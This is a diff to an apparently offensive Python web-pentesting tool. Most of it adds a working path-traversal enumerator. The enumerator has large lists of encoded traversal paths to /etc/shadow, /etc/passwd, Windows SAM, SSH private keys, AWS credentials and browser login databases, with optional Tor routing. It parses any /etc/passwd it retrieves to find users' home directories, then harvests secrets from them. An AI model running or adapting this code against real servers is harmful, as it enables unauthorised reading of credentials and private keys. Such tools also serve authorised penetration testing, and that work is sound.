@@ -1,7 +1,7 @@
 import argparse, requests, time, re, warnings, tldextract, urllib3, os, difflib, logging, random, threading, signal, sys, subprocess, shlex, pprint, http.client, json, textwrap
 import concurrent.futures
 from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
-from urllib.parse import urlparse, urljoin, parse_qs, parse_qsl, urlencode, urlunparse
+from urllib.parse import urlparse, urljoin, parse_qs, parse_qsl, urlencode, urlunparse, quote
 from colorama import init, Fore, Style
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from packaging.version import parse as parse_version, InvalidVersion
@@ -1059,9 +1059,6 @@ def subreponse2(domain):
     
     url = f"https://crt.sh/?q={domain}"
     try:
-
-     
-        
         response = requests.get(url, headers=headers)
         response.raise_for_status()
     except requests.exceptions.RequestException as e:
@@ -1069,7 +1066,6 @@ def subreponse2(domain):
         return
 
     soup = BeautifulSoup(response.text, 'html.parser')
-    
     
     try:
         table = soup.find_all('table')[1] 
@@ -1144,7 +1140,6 @@ def subreponse2(domain):
         print("-" * 50)
         
         time.sleep(0.5)
-        
 
 
 ###############################################################################################################
@@ -1497,7 +1492,7 @@ def display_results(result):
         if not os.path.isfile(vulns_path) or (time.time() - os.path.getmtime(vulns_path)) > 86400:
             print(f"{G}  - [i] wp_vulns.json is missing or outdated. Downloading a fresh copy...")
             try:
-                response = requests.get("https://www.wordfence.com/api/intelligence/v2/vulnerabilities/production", timeout=10)
+                response = requests.get("https://www.wordfence.com/api/intelligence/v2/vulnerabilities/production", timeout=60)
                 response.raise_for_status()
                 with open(vulns_path, "wb") as f:
                     f.write(response.content)
@@ -1513,11 +1508,14 @@ def display_results(result):
                 print(f"{item}")
     
         print(f"\n{M}[Info] {G}Checking Wordpress - Plugins - Themes vulnerabilities")
+        
+      
         try:
             with open(vulns_path, "r", encoding="utf-8") as f:
                 vulns_data = json.load(f)
         except Exception as e:
             print(f"{R}  - [x] Failed to load JSON file : {e}")
+            print(f"{R}  - [x] Try deleting the JSON file and restarting the application")
             return
 
         def extract_item_info(clean_item):
@@ -1610,6 +1608,8 @@ def display_results(result):
     print(f"\n{M}[Info] {G} Wordpress versions vulns : https://wpscan.com/wordpresses/")
     print(f"{M}[Info] {G} Wordpress plugins vulns  : https://wpscan.com/plugins/")
     print(f"{M}[Info] {G} Wordpress thmes vulns    : https://wpscan.com/themes/")
+    print(f"{M}[Info] {G} Wordfense free API       : https://www.wordfence.com/api/intelligence/v2/vulnerabilities/production")
+
 
 def detect_wordpress_version(url, cookies):
     global proxies
@@ -2917,6 +2917,588 @@ def is_there_a_vuln(versions, url_target):
 
 
 ###############################################################################################################
+################################################ Traversal_enum ###############################################
+###############################################################################################################
+
+
+NON_EXISTENT_PATH = "../../../../../../nonexistent_1237456.txt"
+
+COMMON_PATHS_windows = [
+    # Configuration système de base
+    "../../../../../../windows/win.ini",                    # Fichier historique toujours présent
+    "../../../../../../windows/system.ini",                  # Vieux fichier config Windows
+    "../../../../../../windows/system32/drivers/etc/hosts",  # Fichier hosts local
+    "../../../../../../windows/system32/drivers/etc/networks",
+    "../../../../../../windows/system32/drivers/etc/protocol",
+    "../../../../../../windows/system32/drivers/etc/services",
+
+    # SAM et registre (attention, nécessite souvent des privilèges)
+    "../../../../../../windows/system32/config/SAM",         # Comptes locaux
+    "../../../../../../windows/system32/config/SYSTEM",      # Informations système
+    "../../../../../../windows/system32/config/SECURITY",    # Infos de sécurité
+    "../../../../../../windows/system32/config/SOFTWARE",    # Logiciels installés
+    "../../../../../../windows/system32/config/DEFAULT",     # Paramètres par défaut
+
+    # Journaux d'événements
+    "../../../../../../windows/system32/winevt/Logs/System.evtx",
+    "../../../../../../windows/system32/winevt/Logs/Security.evtx",
+    "../../../../../../windows/system32/winevt/Logs/Application.evtx",
+
+    # Fichiers de configuration IIS (serveur web)
+    "../../../../../../inetpub/logs/LogFiles/W3SVC1/u_ex230101.log",  # Exemple log IIS
+    "../../../../../../inetpub/wwwroot/web.config",                    # Config du site IIS
+    "../../../../../../windows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
+]
+
+
+COMMON_PATHS_linux = [
+    # Fichiers config
+    "../.env", "../../.env",
+    "../config.php", "../../config.php",
+    "../settings.php", "../../settings.php",
+    "../wp-config.php", "../../wp-config.php",
+    "../configuration.php", "../../configuration.php",
+    "../env.php", "../../env.php",
+
+    # Logs
+    "../error.log", "../../error.log",
+    "../debug.log", "../../debug.log",
+    "../laravel.log", "../../laravel.log",
+
+    # Backups
+    "../backup.zip", "../../backup.zip",
+    "../config.php.bak", "../../config.php.bak",
+    "../wp-config.php.old", "../../wp-config.php.old",
+
+    # Credentials
+    "../.git/config", "../../.git/config",
+    "../.ssh/id_rsa", "../../.ssh/id_rsa",
+    "../.aws/credentials", "../../.aws/credentials",
+
+    # CMS
+    "../wp-content/debug.log", "../../wp-content/debug.log",
+    "../sites/default/settings.php", "../../sites/default/settings.php",
+    "../storage/logs/laravel.log", "../../storage/logs/laravel.log",
+
+    # Temp
+    "../debug.php", "../../debug.php"
+]
+
+COMMON_PATHS_linux1 = [
+    # ==============================
+    # 1. FICHIERS SYSTÈME CRITIQUES
+    # ==============================
+    "../../../../../../etc/shadow",                   # Hashs mots de passe (root requis)
+    "../../../../../../etc/group",                    # Groupes
+    "../../../../../../etc/hostname",                 # Nom de la machine
+    "../../../../../../etc/hosts",                    # Résolution locale
+    "../../../../../../etc/resolv.conf",              # DNS
+    "../../../../../../etc/os-release",               # Infos OS
+    "../../../../../../etc/issue",                    # Bannière login
+
+    # ==============================
+    # 2. CONFIG RÉSEAU & SERVICES
+    # ==============================
+    "../../../../../../etc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
+    "../../../../../../etc/sysctl.conf",              # Paramètres kernel
+    "../../../../../../etc/services",                 # Liste des ports/services
+    "../../../../../../etc/ssh/sshd_config",          # Config SSH
+
+    # ==============================
+    # 3. LOGS SYSTÈME
+    # ==============================
+    "../../../../../../var/log/syslog",               # Debian/Ubuntu
+    "../../../../../../var/log/messages",             # RedHat/CentOS
+    "../../../../../../var/log/auth.log",             # Authentification
+    "../../../../../../var/log/secure",               # Sécurité (RedHat)
+    "../../../../../../var/log/dmesg",                # Logs kernel
+    "../../../../../../var/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
+    "../../../../../../var/log/httpd/error_log",      # Logs Apache RedHat
+    "../../../../../../var/log/nginx/error.log",      # Logs Nginx
+    "../../../../../../var/log/mysql/error.log",      # Logs MySQL
+
+    # ==============================
+    # 4. FICHIERS WEB
+    # ==============================
+    "../../../../../../var/www/html/index.html",      # Page par défaut
+    "../../../../../../var/www/html/index.php",       # Page PHP
+    "../../../../../../var/www/html/config.php",      # Config PHP
+    "../../../../../../etc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
+    "../../../../../../etc/httpd/conf/httpd.conf",    # Config Apache RedHat
+    "../../../../../../etc/nginx/nginx.conf",         # Config Nginx
+    "../../../../../../etc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
+    "../../../../../../etc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
+    "../../../../../../etc/php.ini",                  # PHP config générique
+
+    # ==============================
+    # 5. BASES DE DONNÉES (SQL)
+    # ==============================
+    "../../../../../../var/lib/mysql/mysql/user.MYD",       # MySQL users
+    "../../../../../../var/lib/mysql/mysql/user.frm",       # MySQL users structure
+    "../../../../../../var/lib/mysql/mysql.db",             # DB principales
+    "../../../../../../var/lib/mysql/mysql/user.ibd",       # Table user
+    "../../../../../../var/lib/mysql/ibdata1",              # Données globales MySQL
+    "../../../../../../var/lib/mysql/ib_logfile0",          # Logs InnoDB
+    "../../../../../../var/lib/mysql/ib_logfile1",          # Logs InnoDB
+    "../../../../../../etc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
+    "../../../../../../etc/my.cnf",                         # Config MySQL générique
+    "../../../../../../var/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
+    "../../../../../../var/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
+    "../../../../../../var/lib/postgresql/data/base",       # Bases PostgreSQL
+    "../../../../../../data/data/com.mysql/databases.db",   # MySQL sur Android
+    "../../../../../../var/www/html/db.sqlite3",            # SQLite Django
+    "../../../../../../var/www/html/database.sqlite",       # SQLite générique
+    "../../../../../../var/www/html/storage/database.sqlite", # Laravel SQLite
+    "../../../../../../var/www/html/db.sql",
+    "../../../../../../var/www/html/backup.sql",
+    "../../../../../../var/lib/mongodb/mongod.lock",
+    "../../../../../../var/lib/redis/dump.rdb",
+    "../../../../../../var/www/html/sql_dump.sql",
+    "../../../../../../var/www/html/backup/db_backup.sql",
+    
+    # ==============================
+    # 6. CMS POPULAIRES
+    # ==============================
+
+    # WordPress
+    "../../../../../../var/www/html/wp-config.php",         # Config WordPress
+    "../../../../../../var/www/html/wp-content/uploads",    # Uploads WP
+    "../../../../../../var/www/html/wp-includes/version.php", # Version WP
+
+    # Drupal
+    "../../../../../../var/www/html/sites/default/settings.php",
+
+    # Joomla
+    "../../../../../../var/www/html/configuration.php",
+
+    # Magento
+    "../../../../../../var/www/html/app/etc/env.php",
+
+    # Laravel
+    "../../../../../../var/www/html/.env",                  # Config Laravel
+    "../../../../../../var/www/html/storage/logs/laravel.log",
+
+    # Django
+    "../../../../../../var/www/html/settings.py",           # Django settings
+
+    # ==============================
+    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
+    # ==============================
+    "../../../../../../.env",                               # Fichier d'env générique
+    "../../../../../../config.json",                        # Config JSON générique
+    "../../../../../../config.php",                         # Config PHP générique
+    "../../../../../../settings.py",                        # Config Django
+    "../../../../../../database.yml",                       # Rails config DB
+    "../../../../../../composer.json",                      # PHP dépendances
+    "../../../../../../package.json",                       # NodeJS dépendances
+    "../../../../../../.git/config",                        # Config Git
+    "../../../../../../.htaccess",                          # Fichier Apache
+    "../../../../../../.htpasswd",                          # Mots de passe Apache
+
+    # ==============================
+    # 8. CRON JOBS
+    # ==============================
+    "../../../../../../etc/crontab",
+    "../../../../../../var/spool/cron/root",
+    "../../../../../../var/spool/cron/crontabs/root",
+    
+    # ==============================
+    # 9. OTHERS
+    # ==============================
+    "../.htaccess", "../../.htaccess",
+    "../.htpasswd", "../../.htpasswd",
+    "../.user.ini", "../../.user.ini",
+    "../web.config", "../../web.config",
+    
+    # Fichiers config
+    "../.env", "../../.env",
+    "../config.php", "../../config.php",
+    "../settings.php", "../../settings.php",
+    "../wp-config.php", "../../wp-config.php",
+    "../configuration.php", "../../configuration.php",
+    "../env.php", "../../env.php",
+
+    # Logs
+    "../error.log", "../../error.log",
+    "../debug.log", "../../debug.log",
+    "../laravel.log", "../../laravel.log",
+
+    # Backups
+    "../backup.zip", "../../backup.zip",
+    "../config.php.bak", "../../config.php.bak",
+    "../wp-config.php.old", "../../wp-config.php.old",
+
+    # Credentials
+    "../.git/config", "../../.git/config",
+    "../.ssh/id_rsa", "../../.ssh/id_rsa",
+    "../.aws/credentials", "../../.aws/credentials",
+
+    # CMS
+    "../wp-content/debug.log", "../../wp-content/debug.log",
+    "../sites/default/settings.php", "../../sites/default/settings.php",
+    "../storage/logs/laravel.log", "../../storage/logs/laravel.log",
+
+    # Temp
+    "../debug.php", "../../debug.php"
+    
+]
+
+
+path_to_home = [
+    # ===============================
+    # 1. HISTORIQUES DE COMMANDES
+    # ===============================
+    ".bash_history",        # Historique des commandes bash
+    ".zsh_history",         # Historique pour Zsh
+    ".mysql_history",       # Commandes MySQL (souvent avec mots de passe !)
+    ".psql_history",        # Commandes PostgreSQL
+    ".sqlite_history",      # Commandes SQLite
+    ".php_history",         # Historique des commandes PHP CLI
+
+    # ===============================
+    # 2. CLES SSH & ACCES REMOTE
+    # ===============================
+    ".ssh/authorized_keys", # Clés autorisées SSH
+    ".ssh/id_rsa",          # Clé privée SSH
+    ".ssh/id_rsa.pub",      # Clé publique SSH
+    ".ssh/config",          # Config SSH
+    ".ssh/known_hosts",     # Machines déjà connectées
+
+    # ===============================
+    # 3. CONFIGURATION DU SHELL
+    # ===============================
+    ".bashrc",
+    ".profile",
+    ".bash_profile",
+    ".bash_logout",
+    ".zshrc",
+    ".cshrc",
+    ".kshrc",
+    ".login",
+    ".logout",
+
+    # ===============================
+    # 4. CONFIGURATION D'APPLICATIONS
+    # ===============================
+    ".gitconfig",           # Config Git
+    ".git-credentials",     # Identifiants Git (tokens souvent en clair)
+    ".docker/config.json",  # Tokens Docker Hub / Registry
+    ".npmrc",               # Tokens NPM
+    ".composer/auth.json",  # Tokens Composer
+    ".aws/credentials",     # Credentials AWS
+    ".gcloud/credentials.db", # GCP Tokens
+
+    # ===============================
+    # 5. FICHIERS DE BASE DE DONNÉES LOCAUX
+    # ===============================
+    "db.sqlite3",
+    "database.sqlite",
+    ".local/share/db.sqlite3",
+    ".config/dbeaver-data-sources.xml", # Config DBeaver avec credentials
+    ".config/pgadmin/pgadmin4.db",     # PostgreSQL pgAdmin config
+
+    # ===============================
+    # 6. FICHIERS DE NAVIGATEURS (SESSIONS, TOKENS)
+    # ===============================
+    ".mozilla/firefox/profiles.ini",
+    ".config/google-chrome/Default/Login Data",
+    ".config/google-chrome/Default/Cookies",
+
+    # ===============================
+    # 7. HISTORIQUES ET JOURNAUX
+    # ===============================
+    ".viminfo",             # Historique vim (souvent chemins de fichiers sensibles)
+    ".lesshst",             # Historique de less
+    ".python_history",      # Historique Python REPL
+    ".wget-hsts",           # Historique wget
+    ".curlrc",              # Config curl (parfois avec tokens)
+
+    # ===============================
+    # 8. CLÉS GPG
+    # ===============================
+    ".gnupg/pubring.kbx",   # Clés publiques GPG
+    ".gnupg/secring.gpg",   # Clés privées GPG
+    ".gnupg/private-keys-v1.d/",
+
+    # ===============================
+    # 9. AUTRES
+    # ===============================
+    ".netrc",               # Identifiants pour FTP, HTTP, etc.
+    ".config/Code/User/settings.json", # Config VS Code
+    ".config/Code/User/keybindings.json",
+    ".config/slack/",       # Tokens Slack
+    ".local/share/keyrings/", # GNOME Keyring (tokens, mdp chiffrés)
+
+
+    # Shell / historique
+    ".zprofile",
+    ".bash_logout",
+    ".zlogout",
+    ".history",
+
+    # SSH
+    ".ssh/id_dsa",
+    ".ssh/id_ecdsa",
+    ".ssh/id_ed25519",
+
+    # Environnements / secrets
+    ".env",
+    ".gnupg/trustdb.gpg",
+
+    # Dépendances / configs dev
+    ".yarnrc",
+    ".composer/config.json",
+    ".pip/pip.conf",
+
+    # Applications / navigateurs
+    ".mozilla/firefox/profiles.ini",
+    ".config/google-chrome/Default/Preferences",
+    ".config/google-chrome/Default/Login Data",
+
+    # Logs / caches
+    ".cache/",
+    ".local/share/",
+    ".config/",
+    ".node_repl_history",
+
+    # Fichiers de sauvegarde ou temporaires
+    ".backup"    
+]
+
+
+def get_response_signature(url, cookies):
+    global proxies
+    
+    try:
+        # Gestion des User-Agents aléatoires
+        if user_agents == "yes":
+            headersX = loadit("payloads/user_agents.txt")
+            headers = {
+                "User-Agent": random.choice(headersX)
+            }
+        else:
+            headers = None
+
+        cookies = cookies or {}
+
+        # Activation du proxy TOR si nécessaire
+        if torusage == "yes":
+            proxies = tor_proxies
+
+        # Requête avec redirection activée
+        r = requests.get(
+            url,
+            headers=headers,
+            cookies=cookies,
+            proxies=proxies,
+            timeout=5,
+            allow_redirects=True
+        )
+
+        # Détection des redirections trop nombreuses
+        if len(r.history) > 5:
+            print(f"{R}[!] Too many redirects - treating as 404")
+            return {
+                "status_code": 404,
+                "length": 0,
+                "snippet": ""
+            }
+
+        # Taille de la réponse
+        response_length = len(r.content)
+
+        # Si la réponse est vide → considéré comme not found
+        if response_length == 0:
+            print(f"{M}[-] Empty response - treating as 404")
+            return {
+                "status_code": 404,
+                "length": 0,
+                "snippet": ""
+            }
+
+        return {
+            "status_code": r.status_code,
+            "length": response_length,
+            "snippet": r.text  # Affiche seulement les 500 premiers caractères
+        }
+
+    except requests.TooManyRedirects:
+        print(f"{R}[!] Too many redirects (exception) - treating as 404")
+        return {
+            "status_code": 404,
+            "length": 0,
+            "snippet": ""
+        }
+
+    except requests.RequestException as e:
+        print(f"{R}[!] Request error : {e}")
+        return None
+
+
+def check_traversal_paths(BASE_URL, method, cookies, max_threads):
+    print(f"{C}[*] Getting baseline response (non-existent file) ...")
+    baseline_url = BASE_URL + NON_EXISTENT_PATH
+    baseline = get_response_signature(baseline_url, cookies)
+
+    if not baseline:
+        print(f"{R}[!] Unable to get baseline response, stopping.")
+        return
+
+    print(f"{C}[*] Baseline - HTTP Code : {baseline['status_code']}, Size : {baseline['length']}")
+
+    # ===============================
+    # 1. HOME DIRS avec etc/passwd
+    # ===============================
+    found_files1 = []
+
+    if method == "Linux":
+        print(f"{C}[*] Testing users home paths if etc/passwd aviable (simple encoded url obfuscation) ...")
+        encoded_path = quote("../../../../../../etc/passwd", safe="")
+        test_url = BASE_URL + encoded_path
+        result = get_response_signature(test_url, cookies)
+
+        if not result:
+            print(f"{M}[-] Not found ...")
+        else:
+            home_dirs = []
+            etc_results = result
+
+            # Parse etc/passwd pour trouver les répertoires /home
+            for line in result['snippet'].strip().splitlines():
+                parts = line.split(":")
+                if len(parts) >= 6:
+                    username = parts[0]
+                    home = parts[5]
+
+                    if home.startswith("/home/"):
+                        home_dirs.append((username, home))
+
+            for user, home in home_dirs:
+                print(f"{G}[+] User : {Y}{user}")
+
+            # --- Multithread sur les fichiers dans les homes ---
+            def test_home_file(user, home, sensitive_file):
+                path = f"{home}/{sensitive_file}"
+                encoded_path = quote("../../../../../.." + path, safe="")
+                test_url = BASE_URL + encoded_path
+                result = get_response_signature(test_url, cookies)
+
+                if not result:
+                    return None
+
+                # Comparaison avec la baseline
+                if (result['status_code'] != baseline['status_code']) or (result['length'] != baseline['length']):
+                    if result['status_code'] != 404:
+                        print(f"{G}[+] Potential file found : {Y}{path}")
+                        return {
+                            "path": path,
+                            "status_code": result['status_code'],
+                            "length": result['length'],
+                            "snippet": result['snippet']
+                        }
+                    else:
+                        print(f"{M}[-] Status code 404 or treated as 404 : {Y}{path}")
+                else:
+                    print(f"{M}[-] No difference for : {Y}{path}")
+                return None
+
+            # ThreadPool pour tester les fichiers sensibles dans les home dirs
+            with ThreadPoolExecutor(max_threads) as executor:
+                futures = [
+                    executor.submit(test_home_file, user, home, sensitive_file)
+                    for user, home in home_dirs
+                    for sensitive_file in path_to_home
+                ]
+
+                for future in as_completed(futures):
+                    res = future.result()
+                    if res:
+                        found_files1.append(res)
+
+            print(f"{G}\n--- etc/passwd ---")
+            print(f"{G}HTTP Code  : {R}{etc_results['status_code']}")
+            print(f"{G}Size       : {R}{etc_results['length']}")
+            print(f"{Y}{etc_results['snippet']}\n{G}")
+            print("-"*60)
+
+    # ===== Affichage final pour les home dirs =====
+    print(f"\n{Y}" + "="*60)
+    print(f"{C}[#] Final Report for Users Home Path Traversal Test{Y}")
+    print("="*60)
+
+    if found_files1:
+        print(f"{G}[+] Total files found: {len(found_files1)}\n")
+        for idx, file in enumerate(found_files1, start=1):
+            print(f"{G}--- File {idx} ---")
+            print(f"{G}Path       : {Y}{file['path']}")
+            print(f"{G}HTTP Code  : {R}{file['status_code']}")
+            print(f"{G}Size       : {R}{file['length']}")
+            print(f"{Y}{file['snippet']}\n{G}")
+            print("-"*60)
+        print("")
+    else:
+        print(f"{R}[!] No files were found matching known traversal paths.\n")
+
+    # ===============================
+    # 2. PATHS GÉNÉRIQUES / CONNUS
+    # ===============================
+    print(f"{C}[*] Testing known paths (simple encoded url obfuscation) ...")
+
+    paths_to_test = COMMON_PATHS_windows if method == "Windows" else COMMON_PATHS_linux
+    found_files = []
+
+    def test_known_path(path):
+        encoded_path = quote(path, safe="")
+        test_url = BASE_URL + encoded_path
+        result = get_response_signature(test_url, cookies)
+
+        if not result:
+            return None
+
+        if (result['status_code'] != baseline['status_code']) or (result['length'] != baseline['length']):
+            if result['status_code'] != 404:
+                print(f"{G}[+] Potential file found : {Y}{path}")
+                return {
+                    "path": path,
+                    "status_code": result['status_code'],
+                    "length": result['length'],
+                    "snippet": result['snippet']
+                }
+            else:
+                print(f"{M}[-] Status code 404 or treated as 404 : {Y}{path}")
+        else:
+            print(f"{M}[-] No difference for : {Y}{path}")
+        return None
+
+    # Multithreading sur les paths connus
+    with ThreadPoolExecutor(max_threads) as executor:
+        futures = [executor.submit(test_known_path, path) for path in paths_to_test]
+
+        for future in as_completed(futures):
+            res = future.result()
+            if res:
+                found_files.append(res)
+
+    # ===== Affichage final =====
+    print(f"\n{Y}" + "="*60)
+    print(f"{C}[#] Final Report for Path Traversal Test{Y}")
+    print("="*60)
+
+    if found_files:
+        print(f"{G}[+] Total files found: {len(found_files)}\n")
+        for idx, file in enumerate(found_files, start=1):
+            print(f"{G}--- File {idx} ---")
+            print(f"{G}Path       : {Y}{file['path']}")
+            print(f"{G}HTTP Code  : {R}{file['status_code']}")
+            print(f"{G}Size       : {R}{file['length']}")
+            print(f"{Y}{file['snippet']}\n{G}")
+            print("-"*60)
+    else:
+        print(f"{R}[!] No files were found matching known traversal paths.\n")
+    
+    
+    
+###############################################################################################################
 ################################################### main menu #################################################
 ###############################################################################################################
 
@@ -2954,6 +3536,8 @@ def main():
     parser.add_argument("-cr", '--crlf', action="store_true", help=f"Try to exploit crlf injection. Payloads into payloads/crlf.txt")
     parser.add_argument("-i", '--infos', action="store_true", help=f"Check basics webpage infos (headers, vulnerable source or sinks, Click-Hijacking, ...)")
     parser.add_argument("--vuln", action="store_true", help=f"Check somme vulns in passive mode (next.js middleware)")
+    parser.add_argument("--traversal-windows", action="store_true", help=f"Testing different default files for path traversal on a Windows server")
+    parser.add_argument("--traversal-linux", action="store_true", help=f"Testing different default files for path traversal on a Linux server")
     parser.add_argument("--dalfox", action="store_true", help="Use dalfox")
     parser.add_argument("--sqlmap", action="store_true", help="Use sqlmap")
     parser.add_argument("--nuclei", action="store_true", help="Use nuclei")
@@ -3003,7 +3587,7 @@ def main():
 
     if args.tor and args.proxie:
         parser.error("You cannot specify both --tor and --proxie at the same time")
-
+        
 
     if args.sqlmap:
         confirm = input(f"\n{M}[Info] {G}Do you want to add parameters for sqlmap (y/n/h) : {Y}").strip()
@@ -3130,6 +3714,14 @@ def main():
 
     
     cookies = parse_cookies(args.cookies) if args.cookies else {}
+
+
+    if args.traversal_windows:
+        check_traversal_paths(args.url, "Windows", cookies, max_threads=7)
+    
+    if args.traversal_linux:
+        check_traversal_paths(args.url, "Linux", cookies, max_threads=7)
+    
 
     if args.file:
         urls_from_file = loadit(args.file)
